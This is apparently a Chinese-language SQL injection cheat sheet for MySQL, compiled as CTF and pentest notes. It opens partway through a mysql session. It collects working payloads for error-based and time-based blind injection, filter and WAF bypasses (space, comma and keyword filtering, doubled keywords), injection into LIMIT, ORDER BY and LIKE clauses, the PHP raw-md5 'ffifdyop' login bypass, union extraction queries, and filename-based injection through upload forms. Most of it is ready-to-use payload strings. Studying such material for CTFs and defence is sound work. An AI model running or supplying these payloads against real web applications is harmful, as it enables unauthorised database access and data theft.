1 row in set (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.00 sec)

mysql> select query from sys.statement_analysis;
+-------------------------------------------------------------------+
| query                                                             |
+-------------------------------------------------------------------+
| SELECT `cat` . `name` AS `CATA ... s_database` ( `sch` . `name` ) |
| SELECT @@`skip_networking` , @ ... ssl_crlpath` , @@`tls_version` |
| SELECT @@`version_comment` LIMIT ?                                |
| SELECT `version` ( )                                              |
+-------------------------------------------------------------------+
4 rows in set (0.03 sec)
```

## 报错盲注

```mysql
mysql> SELECT 18446744073709551610 * 2;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551610 * 2)'
mysql> SELECT 18446744073709551610 * 1;
+--------------------------+
| 18446744073709551610 * 1 |
+--------------------------+
|     18446744073709551610 |
+--------------------------+
1 row in set (0.00 sec)
mysql> SELECT updatexml(1,'@',1);
ERROR 1105 (HY000): XPATH syntax error: ''
mysql> SELECT updatexml(1,'1',1);
+--------------------+
| updatexml(1,'1',1) |
+--------------------+
| NULL               |
+--------------------+
1 row in set (0.00 sec)
mysql> SELECT pow(9999,100);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(9999,100)'
mysql> SELECT pow(9999,1);
+-------------+
| pow(9999,1) |
+-------------+
|        9999 |
+-------------+
1 row in set (0.00 sec)
mysql> SELECT exp((select 1)*18446744073709551615);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp((1 * 18446744073709551615))'
mysql> SELECT exp((select 0)*18446744073709551615);
+--------------------------------------+
| exp((select 0)*18446744073709551615) |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row in set (0.00 sec)
```

## 时间盲注

[MySQL时间盲注五种延时方法](https://www.smi1e.top/sql注入笔记/[https://www.cdxy.me/?p=789](https://www.cdxy.me/?p=789))

```sql
sleep就不用说了

BENCHMARK(count,expr) 
BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。
mysql> select benchmark(10000000,sha(1));
+----------------------------+
| benchmark(10000000,sha(1)) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (2.02 sec)

笛卡尔积
mysql> select if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0);
+---------------------------------------------------------------------------------------------+
| if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0) |
+---------------------------------------------------------------------------------------------+
|                                                                                    41809156 |
+---------------------------------------------------------------------------------------------+
1 row in set (1.08 sec)

GET_LOCK
在一个session中可以先锁定一个变量例如：select get_lock('admin',1)
然后通过另一个session 再次执行get_lock函数 select get_lock('admin',5),此时会产生5 秒的延迟，其效果类似于sleep(5)。
但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。
```

![历史配图暂缺](redacted-image:missing)

```sql
RLIKE/REGEXP
通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。
mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
+-------------------------------------------------------------+
| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (6.63 sec)

mysql> select rpad('a',4999999,'a') regexp concat(repeat('(a.*)+',30),'b');
+--------------------------------------------------------------+
| rpad('a',4999999,'a') regexp concat(repeat('(a.*)+',30),'b') |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (6.75 sec)
```

## 过滤逗号

```mysql
mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)

mysql> select mid(user() from -1);
+---------------------+
| mid(user() from -1) |
+---------------------+
| t                   |
+---------------------+
1 row in set (0.00 sec)

mysql> select mid(user() from -2);
+---------------------+
| mid(user() from -2) |
+---------------------+
| st                  |
+---------------------+
1 row in set (0.00 sec)
mysql> select * from users union select * from (select 1)a join (select 2)b join (select 3)c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  1 | 2        | 3          |
+----+----------+------------+
4 rows in set (0.00 sec)
```

## 数字型过滤and or

```mysql
mysql> select * from users where id=1/(select sleep(3));
Empty set, 17 warnings (51.06 sec)
```

## 无information_schema找表名的替代方法

[Alternatives to Extract Tables and Columns from MySQL and MariaDB](https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/)
需要mysql版本>5.7

```mysql
mysql> select * from sys.x$schema_flattened_keys;
+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+
| table_schema | table_name            | index_name      | non_unique | subpart_exists | index_columns                     |
+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+
| security     | emails                | PRIMARY         |          0 |              0 | id                                |
| security     | referers              | PRIMARY         |          0 |              0 | id                                |
| security     | uagents               | PRIMARY         |          0 |              0 | id                                |
| security     | users                 | PRIMARY         |          0 |              0 | id                                |
+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+
```

或者

```mysql
mysql> select * from sys.schema_table_statistics;
```

## 在没有列名的情况下检索数据

![历史配图暂缺](redacted-image:missing)

```mysql
mysql> SELECT * FROM USERS WHERE ID =1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 123      | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
mysql> SELECT * FROM USERS WHERE ID = ((select 1,123,'Dumb') <= (select * from users limit 1));
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 123      | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> SELECT * FROM USERS WHERE ID = ((select 2,123,'Dumb') <= (select * from users limit 1));
Empty set (0.00 sec)
```

通过小于号替换等号，可以逐字符检索出数据。不过还有一个问题——`MySQL中的字符串比较在默认情况下是不区分大小写的`。

将字符串转换为二进制格式后，会强制进行字节对字节的比较

```mysql
mysql> select 'd'='D';
+---------+
| 'd'='D' |
+---------+
|       1 |
+---------+
1 row in set (0.00 sec)  
mysql> select BINARY('d')>BINARY('D');
+-------------------------+
| BINARY('d')>BINARY('D') |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)
mysql> select (select 1,123,BINARY('dumb')) <= (select * from users limit 1);
+----------------------------------------------------------------+
| (select 1,123,BINARY('dumb')) <= (select * from users limit 1) |
+----------------------------------------------------------------+
|                                                              0 |
+----------------------------------------------------------------+
1 row in set (0.01 sec)
```

不过`BINARY`中含有关键字`in`。
MySQL中的JSON对象是二进制对象，因此，`CAST(0 AS JSON)`会返回一个二进制字符串，进而`SELECT CONCAT(“A”, CAST(0 AS JSON))`也会返回一个二进制字符串。

```
CAST (expression AS data_type)
参数说明：

expression：任何有效的SQServer表达式。
AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。
data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。
```

![历史配图暂缺](redacted-image:missing)

## 奇淫技巧

通常注入利用的姿势不是靠一个点就可以突破的，往往需要结合许多姿势技巧

mysql的注入过程中，我们用得到的一些：
常量：`true， false， null， \N, current_timestamp`
变量：`@myvar:=1`

系统变量：`@@version, @@datadir....`

常用函数：`version(), pi(), pow(), char(), substring()`

字符串生成：`hex(), conv()`

 有关于字符串生成的一些基础字符(其余的字符可以由此扩展)：

```sql
true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6
```

### 1、过滤的绕过

过滤空格：`%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释`

过滤and，or：||，&&

union select：

```sql
利用括号，'and(true)like(false)union(select(pass)from(users))，
方括号union [all|distinct] select pass from users#，
union%a0select pass from users，
或者内联注释union/*&sort=*/select pass from users#
```

union：`子查询进行盲注and length((select pass from users having substr(pass,1,1)='a'))`

having：`and(select substr(group_concat(pass),1,1)from users)='a`

select ... from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)：

```sql
select [all|distinct] pass from users
select`table_name`from`information_schema` . `tables`
select pass as alias from users
select pass aliasalias from users
select pass`alias alias`from users
select+pass%a0from(users)
```

and,&,or,|：

```sql
这里就是可以利用上文中提到的false注入的方式进行绕过
可以通过字符串比较引入查询
譬如'=1=(select .....)
```

过滤逗号：`' and substr(data from 1 for 1) = 'a'#`

### 2、技巧

### 2.1、like

有时候我们可以利用一些逻辑语句进行注入例如在最近的0ctf上的Temmo’s Tiny Shop这个题中，我们在搜索的时候推测出语句是在like后的，就可以通过left来进行like盲注

```sql
if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)
```

### 2.2、Limt

在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO是需要写的权限。

利用PROCEDURE 有两种方式，基于报错和时间的，具体文章见这里[Mysql下Limit注入方法](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

**此方法适用于MySQL 5.x中，在limit语句后面的注入**

> 下面的语句包含了ORDER BY，MySQL当中UNION语句不能在ORDER BY的后面
>
> **在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。**



基于报错：

```sql
mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```

基于时间：

```sql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

### 2.3、order by

order by 后的数字可以作为一个注入点。具体可以看这个文章[MySQL Order By 注入总结](https://www.secpulse.com/archives/57197.html)

这里可以用一些判断和返回值进行利用，

```sql
/?order=IF(1=1,name,price) 通过name字段排序
/?order=IF(1=2,name,price) 通过price字段排序
/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序
/?order=IFNULL(NULL,price) 通过price字段排序
/?order=IFNULL(NULL,name) 通过name字段排序
```

还可以用rand函数

```sql
/?order=rand(1=1)
/?order=rand(1=2)
```

通常这里我们是不知道列名的，那可以通过报错进行利用

```sql
/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常
/?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误

利用regexp
/?order=(select+1+regexp+if(1=1,1,0x00)) 正常
/?order=(select+1+regexp+if(1=2,1,0x00)) 错误

利用updatexml
/?order=updatexml(1,if(1=1,1,user()),1) 正确
/?order=updatexml(1,if(1=2,1,user()),1) 错误

利用extractvalue
/?order=extractvalue(1,if(1=1,1,user())) 正确
/?order=extractvalue(1,if(1=2,1,user())) 错误

利用sleep
/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒

数据猜解
通过下可以得知user()第一位为r,ascii码的16进制为0x72：
/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误
猜解当前数据库的表名：
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+
table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+
table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
猜解指定表名中的列名：
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns
+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常

/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns
+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误
```

### 3、有关函数

### 3.1 不常用函数绕过滤

```sql
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'
rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'
left(data,1)
reverse(right(reverse(data),1))
insert(insert(version(),1,0,space(0)),2,222,space(0))
```

### 3.2 搜索匹配类的函数

```sql
'-if(locate('f',data),1,0)#
'-if(locate('fo',data),1,0)#
'-if(locate('foo',data),1,0)#
instr(), position()
```

### 3.3、一些数学函数

```sql
1、format(x,y)  函数，功能是将一个数字x，保留y位小数，并且整数部分用逗号分隔千分位，小数部分四舍五入。
2、abs();  求一个数的绝对值；absolute
3、sqrt();求一个数的平方根。sqrt是sqruar(平方，矩形) ，root（根）的缩写。
4、mod(x,y)  x除数，y被除数。结束是余数。
5、ceil()  进一取整。floor()舍一取整
这两个函数是镜子函数，比较有点意思。这两个函数并不进行四舍五入，比较强硬。
6、rand()  顾名思义，是用来生成随机数用的。种子不变数值不变。
7、format 会自动进行千分位，下面我们来看看round函数，进行四舍五入。
8、truncate(x,y)  比较霸道，不管四舍五入，直接把x，的y位小数直接干掉。
9、sign() 返回当前结果得符号，如果是负数返回-1，如果是0 返回0 如果是正数，返回1.
10、power()  幂运算
11.SIN(X)、ASIN(X)、COS(X)、ACOS(X)、TAN(X)、ATAN(X)、COT(X)  三角函数
12.RADIANS(X) 和 DEGREES(X): 角度与弧度转换函数
13. LOG(X)和LOG10(X): 对数运算函数
14. POW(X,Y), POWER(X,Y)和EXP(X)
```

### 3.4、使用函数进行字符串的切割

```sql
length(trim(leading 'a' FROM data)) # length will be shorter
length(replace(data, 'a', '')) # length will be shorter
```

### 3.5、字符串连接

```mysql
select concat_ws('|','11','22','33');//11|22|33
select concat('11','22','33');//112233
select "a"'d'"m"'i'"n";
```

### 4 关于php中md5的一个有意思的小技巧

PHP中这么一段sql语句

```sql
$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

这里是可以注入绕过的，在php关于[MD5函数](http://php.net/manual/en/function.md5.php)的介绍说

如果可选的 `raw_output` 被设置为 **TRUE**，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。

也就是找到一个字符串MD5的二进制恰好和字符编码中的某些编码对上了，就可以产生注入，原文作者找到这么一串字符串`ffifdyop`,md5加密后对应字符编码刚好是`'or'<trash>`,便产生注入

> [原文在这](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)



### 5、常用

```sql
1' union select 1,1,database() #
1' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #
1' union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=' xxx' #
1' union select 1,1,xx from xxxx.xxx # 
or 
1'union select 1,1,group_concat(xx) from xxx #
```

### 6、SQL与文件上传

典型的2015RCTF题型 打着文件上传的幌子，实际上是SQL注入，注入方式也很特别，所以当我们拿到文件上传想关题目，什么姿势都试过了，却拿不到flag，这个时候可以换个方式，找找注入点，一般注入点在filename,payload如下:

#### 爆库：

```sql
'+(selselectect CONV(substr(hex(database()),1,12),16,10))+'.jpg
(16=>10=>hex=>)
'+(selselectect CONV(substr(hex(database()),13,12),16,10))+'.jpg
(16=>10=>hex=>)
```

#### 爆表名：

```sql
'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg

'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),13,12),16,10))+'.jpg

'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),25,12),16,10))+'.jpg
```

#### 爆列名

```sql
'+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg

'+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg
```

#### 爆值

```sql
'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg

'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg

'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
```

类似于这样的题目都是骚题目，所以flag肯定不会一下就出来，每次只会 出来一部分，所以需要我们迂回注入
即为修改一下substr的起始位置参数，看看后边还有没有
当然根据情况而定，如果一次性爆出来就不需要迂回了
